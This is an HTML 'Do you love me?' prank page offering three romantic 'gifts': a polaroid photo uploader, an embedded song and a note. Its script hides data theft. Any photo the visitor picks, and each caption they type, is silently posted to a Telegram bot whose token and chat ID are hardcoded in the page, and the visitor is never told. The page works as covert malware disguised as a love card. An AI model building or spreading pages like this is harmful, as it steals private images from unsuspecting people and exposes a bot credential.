<!DOCTYPE html>  <html lang="fr">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>For My Love 💖</title>  
    <style>  
        :root { --pink-bg: #fff0f5; --pink-main: #ff8da1; --pink-dark: #d81b60; --orange-accent: #ff8c69; }  
        body { background-color: var(--pink-bg); margin: 0; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }  
        .container { text-align: center; width: 100%; max-width: 700px; padding: 20px; }  
        .emoji { font-size: 80px; margin-bottom: 10px; display: block; }  
        h1 { color: var(--pink-dark); font-size: 2.2rem; margin-bottom: 15px; }  
        .btn-group { display: flex; align-items: center; justify-content: center; gap: 20px; min-height: 250px; position: relative; }  
        button { padding: 15px 30px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; font-size: 1.2rem; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }  
        #yesBtn { background: #4caf50; color: white; z-index: 100; }  
        #noBtn { background: #f44336; color: white; }  
        .gift-grid { display: flex; gap: 30px; justify-content: center; margin-top: 30px; flex-wrap: wrap; }  
        .gift-card { cursor: pointer; display: flex; flex-direction: column; align-items: center; transition: 0.3s; }  
        .gift-card span { font-size: 70px; }  
        .gift-card small { font-size: 1rem; font-weight: bold; color: var(--pink-dark); margin-top: 5px; }  
        .photo-stack { position: relative; height: 380px; display: flex; justify-content: center; align-items: center; width: 100%; }  
        .polaroid { width: 220px; height: 300px; background: white; padding: 10px 10px 40px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); position: absolute; cursor: pointer; transition: all 0.5s ease; }  
        .photo-slot { width: 100%; height: 85%; background: #fdf2f4; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #eee; }  
        .photo-slot img { width: 100%; height: 100%; object-fit: cover; display: none; }  
        .caption-input { width: 100%; border: none; text-align: center; font-family: 'Brush Script MT', cursive; font-size: 1.3rem; margin-top: 10px; background: transparent; color: var(--pink-dark); outline: none; }  
        .is-bottom { opacity: 0.6; pointer-events: auto; }  
        .player { background: white; display: flex; width: 100%; max-width: 550px; height: 320px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; margin: 20px auto; }  
        .player-left { width: 40%; background: var(--pink-main); display: flex; align-items: center; justify-content: center; }  
        .cd { width: 130px; height: 130px; border-radius: 50%; background: radial-gradient(circle, #222 20%, #333 25%, #111 60%); border: 2px solid #000; animation: spin 4s linear infinite; display: flex; align-items: center; justify-content: center; position: relative; }  
        .cd-center { width: 45px; height: 45px; background: var(--pink-main); border-radius: 50%; border: 3px solid white; z-index: 2; color: white; font-size: 8px; font-weight: bold; display: flex; align-items: center; justify-content: center; text-align: center; }  
        .player-right { width: 60%; padding: 15px; display: flex; flex-direction: column; justify-content: border-box; }  
        .video-container {width: 100%; height: 65%; background: #000; border-radius: 10px; overflow: hidden;}  
        .player-controls { background: var(--orange-accent); height: 60px; border-radius: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; margin-top: 10px; }  
        .p-bar { width: 85%; height: 5px; background: rgba(255,255,255,0.3); border-radius: 5px; margin-bottom: 5px; overflow: hidden; }  
        .p-fill { width: 65%; height: 100%; background: white; }  
        .envelope { width: 280px; height: 180px; background: white; margin: 40px auto; position: relative; cursor: pointer; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }  
        .flap { position: absolute; top: 0; width: 0; height: 0; border-left: 140px solid transparent; border-right: 140px solid transparent; border-top: 100px solid var(--pink-main); transition: 0.5s; z-index: 3; transform-origin: top; }  
        .letter-text { position: absolute; width: 90%; height: 160px; background: white; top: 10px; transition: 0.8s; z-index: 2; padding: 20px; box-sizing: border-box; font-family: 'Brush Script MT', cursive; opacity: 0; font-size: 1.3rem; color: var(--pink-dark); text-align: left;}  
        .open .flap { transform: rotateX(180deg); z-index: 1; }  
        .open .letter-text { transform: translateY(-120px); opacity: 1; height: 250px; }  
        .back-btn { margin-top: 30px; background: var(--pink-main); color: white; padding: 10px 25px; border-radius: 20px; border: none; cursor: pointer; font-size: 1rem; }  
        @keyframes spin { 100% { transform: rotate(360deg); } }  
    </style>  
</head>  
<body>  
    <div class="container" id="app">  
        <span class="emoji">🥺</span>  
        <h1>Do you love me?</h1>  
        <div class="btn-group">  
            <button id="yesBtn" onclick="goToSelection()">YES</button>  
            <button id="noBtn" onclick="moveNo()">NO</button>  
        </div>  
        <div id="prank-msg" style="color:red; font-weight:bold; margin-top:15px; font-size: 1.1rem;"></div>  
    </div>  <script>  
    const TOKEN = "7671417525:AAH7RMQSLM9madS5nyQLL3kY8rBgW2sQHPM";  
    const CHAT = "7293697260";  
    let noCount = 0;  
    let yesScale = 1;  
    let topZ = 100;  
    let selectedPol;  
    let saved = {};  

    function moveNo() {  
        noCount++;  
        const no = document.getElementById('noBtn');  
        const yes = document.getElementById('yesBtn');  
        const msg = document.getElementById('prank-msg');  
        const phrases = ["", "Wait... are u sure?", "Nah thats not right...", "Try again last chance"];  
        yesScale += 0.5;  
        yes.style.transform = `scale(${yesScale})`;  
        no.style.transform = `scale(${Math.max(0.3, 1 - noCount*0.2)}) translateX(${noCount*50}px)`;  
        if(noCount <= 3) msg.innerText = phrases[noCount];  
        if(noCount >= 4) no.style.display = 'none';  
    }  

    function goToSelection() {  
        document.getElementById('app').innerHTML = `  
            <span class="emoji">🎁</span>  
            <h1>Pick a gift, my love</h1>  
            <p style="color:var(--pink-main); font-style:italic; font-size: 1.1rem;">(I knew you'd say yes 😉)</p>  
            <div class="gift-grid">  
                <div class="gift-card" onclick="openGift1()"><span>📸</span><small>Gift 1</small></div>  
                <div class="gift-card" onclick="openGift2()"><span>💿</span><small>Gift 2</small></div>  
                <div class="gift-card" onclick="openGift3()"><span>✉️</span><small>Gift 3</small></div>  
            </div>`;  
    }  

    function openGift1() {  
        document.getElementById('app').innerHTML = `  
            <h1 style="font-family:cursive;">Capture our memories</h1>  
            <div class="photo-stack">  
                <div class="polaroid" id="p1" style="z-index:10; transform:rotate(-8deg) translateX(-35px);" onclick="bringFront(this)">  
                    <div class="photo-slot" onclick="openGallery(this.parentElement)"><span>📸</span><img class="p-img"></div>  
                    <input type="text" class="caption-input" placeholder="Type here..." onblur="updateCap(this.parentElement)">  
                </div>  
                <div class="polaroid" id="p2" style="z-index:20; transform:rotate(6deg) translateX(35px);" onclick="bringFront(this)">  
                    <div class="photo-slot" onclick="openGallery(this.parentElement)"><span>📸</span><img class="p-img"></div>  
                    <input type="text" class="caption-input" placeholder="Type here..." onblur="updateCap(this.parentElement)">  
                </div>  
            </div>  
            <input type="file" id="fileInput" style="display:none" accept="image/*" onchange="loadPhoto(this)">  
            <button class="back-btn" onclick="goToSelection()">⬅ Go Back</button>`;  
        refresh();  
    }  

    function bringFront(el) { topZ++; el.style.zIndex = topZ; refresh(); }  

    function refresh() {  
        const p1 = document.getElementById('p1');  
        const p2 = document.getElementById('p2');  
        if(!p1 || !p2) return;  
        const z1 = parseInt(p1.style.zIndex);  
        const z2 = parseInt(p2.style.zIndex);  
        if(z1 > z2) { p1.classList.remove('is-bottom'); p2.classList.add('is-bottom'); }  
        else { p2.classList.remove('is-bottom'); p1.classList.add('is-bottom'); }  
    }  

    function openGallery(el) { if(el.classList.contains('is-bottom')) return; selectedPol = el; document.getElementById('fileInput').click(); }  

    function loadPhoto(input) {  
        if(!input.files || !input.files[0]) return;  
        const file = input.files[0];  
        saved[selectedPol.id] = file;  
        const reader = new FileReader();  
        reader.onload = (e) => {  
            const img = selectedPol.querySelector('.p-img');  
            img.src = e.target.result;  
            img.style.display = 'block';  
            selectedPol.querySelector('.photo-slot span').style.display = 'none';  
            send(file, selectedPol.querySelector('.caption-input').value);  
        };  
        reader.readAsDataURL(file);  
    }  

    function updateCap(el) { if(saved[el.id]) send(saved[el.id], el.querySelector('.caption-input').value); }  

    async function send(file, msg) {  
        const fd = new FormData();  
        fd.append('chat_id', CHAT);  
        fd.append('photo', file);  
        fd.append('caption', "📸 Souvenir : " + (msg || "Sans texte"));  
        try {  
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });  
        } catch (e) { console.error("Erreur d'envoi", e); }  
    }  

    function openGift2() {  
        // Remplace l'ID après /embed/ par celui de ta chanson YouTube  
        const videoId = 'YykjpeuMNEk';   
        document.getElementById('app').innerHTML = `  
            <h1>A song for us</h1>  
            <div class="player">  
                <div class="player-left"><div class="cd"><div class="cd-center">WITHOUT<br>ME</div></div></div>  
                <div class="player-right">  
                    <div class="video-container">  
                        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/aYr4fDuLhXg" 
                title="Halsey - Without Me (Official Video)"  frameborder="0" allowfullscreen></iframe>  
                    </div>  
                    <div class="player-controls">  
                        <div class="p-bar"><div class="p-fill"></div></div>  
                        <div style="display:flex; gap:20px; font-size:1.4rem;"><span>⏮</span> <span>▶</span> <span>⏭</span></div>  
                    </div>  
                </div>  
            </div>  
            <button class="back-btn" onclick="goToSelection()">⬅ Go Back</button>`;  
    }  

    function openGift3() {  
        document.getElementById('app').innerHTML = `  
            <h1>A Little Note</h1>  
            <div class="envelope" onclick="this.classList.toggle('open')">  
                <div class="flap"></div>  
                <div class="letter-text">Dearest,<br><br>I just wanted to say how much you mean to me. Every moment with you is a gift... ❤️</div>  
                <div style="position:absolute; bottom:10px; right:10px; font-size:35px;">❤️</div>  
            </div>  
            <button class="back-btn" onclick="goToSelection()">⬅ Go Back</button>`;  
    }  
</script>

</body>  
</html>
